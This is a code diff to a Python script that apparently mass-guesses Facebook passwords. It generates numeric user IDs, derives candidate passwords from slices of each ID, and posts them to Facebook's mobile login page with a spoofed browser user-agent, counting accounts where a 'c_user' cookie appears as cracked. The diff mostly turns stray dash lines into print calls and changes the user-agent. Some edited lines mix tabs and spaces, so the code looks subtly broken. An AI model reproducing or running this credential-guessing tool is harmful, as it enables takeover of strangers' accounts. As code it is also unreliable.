@@ -250,11 +250,12 @@ def x():
 		print('\033[1;35m[\033[1;32m✓] This massage is for my hatters')
 		print('\033[97;35m [\033[1;32m✓]      The FIRE Is Back')
 		print(f'\033[97;35m [\033[1;32m✓] Successfully Update Done 3:2.1')
-	        ----------------------------------------------------------------
+	        print('----------------------------------------------------------------')
 		print('\033[97;15m [\033[1;23m•\033[97;35m] Total ids:\033[1;92m '+tl)
 		print('\033[97;35m [\033[1;32m•\033[97;35m] SPEED BOOST (ON/OF) AIRPLANE MODE)
-		----------------------------------------------------------------      
-		for guru in user:
+		print('----------------------------------------------------------------')      
+		print(50*'_')
+	        for guru in user:
 			uid = kode+guru
 			ps1 = uid[6:]
 			ps2 = uid[5:]
@@ -286,10 +287,10 @@ def virus():
 		print('\033[1;35m[\033[1;32m✓] This massage is for my hatters')
 		print('\033[97;35m [\033[1;32m✓]      The FIRE Is Back')
 		print(f'\033[97;35m [\033[1;32m✓] Successfully Update Done 3:2.1')
-		----------------------------------------------------------------
+                print('----------------------------------------------------------------')
 		print('\033[97;15m [\033[1;23m•\033[97;35m] Total ids:\033[1;92m '+tl)
 		print('\033[97;35m [\033[1;32m•\033[97;35m] SPEED BOOST (ON/OF) AIRPLANE MODE')
-		----------------------------------------------------------------
+		print('----------------------------------------------------------------')
 		print(50*'_')
 		for guru in user:
 			uid = kode+koda+kodb+guru
@@ -317,13 +318,13 @@ def virus2():
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
-		print('\033[1;35m[\033[1;32m✓] This massage is for my hatters')
+                print('\033[1;35m[\033[1;32m✓] This massage is for my hatters')
 		print('\033[97;35m [\033[1;32m✓]      The FIRE Is Back')
 		print(f'\033[97;35m [\033[1;32m✓] Successfully Update Done 3:2.1')
-		----------------------------------------------------------------
+                print('----------------------------------------------------------------')
 		print('\033[97;15m [\033[1;23m•\033[97;35m] Total ids:\033[1;92m '+tl)
 		print('\033[97;35m [\033[1;32m•\033[97;35m] SPEED BOOST (ON/OF) AIRPLANE MODE')
-		----------------------------------------------------------------
+		print('----------------------------------------------------------------')
 		print(50*'_')
 		for guru in user:
 			uid = kode+koda+kodb+guru
@@ -351,13 +352,13 @@ def virus3():
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
-		print('\033[1;35m[\033[1;32m✓] This massage is for my hatters')
+                print('\033[1;35m[\033[1;32m✓] This massage is for my hatters')
 		print('\033[97;35m [\033[1;32m✓]      The FIRE Is Back')
 		print(f'\033[97;35m [\033[1;32m✓] Successfully Update Done 3:2.1')
-		----------------------------------------------------------------
+                print('----------------------------------------------------------------')
 		print('\033[97;15m [\033[1;23m•\033[97;35m] Total ids:\033[1;92m '+tl)
 		print('\033[97;35m [\033[1;32m•\033[97;35m] SPEED BOOST (ON/OF) AIRPLANE MODE')
-		----------------------------------------------------------------
+		print('----------------------------------------------------------------')
 		print(50*'_')
 		for guru in user:
 			uid = kode+koda+kodb+guru
@@ -532,7 +533,7 @@ def c(uid,pwx,tl):
             "sec-fetch-site": 'none',
             "sec-fetch-user": '?1',
             "upgrade-insecure-requests": '1',
-            "user-agent": 'Mozilla/5.0 (MeeGo; NokiaN9) AppleWebKit/534.13 (KHTML, like Gecko) NokiaBrowser/8.5.0 Mobile Safari/534.13'}
+            "user-agent": 'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36'}
             lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
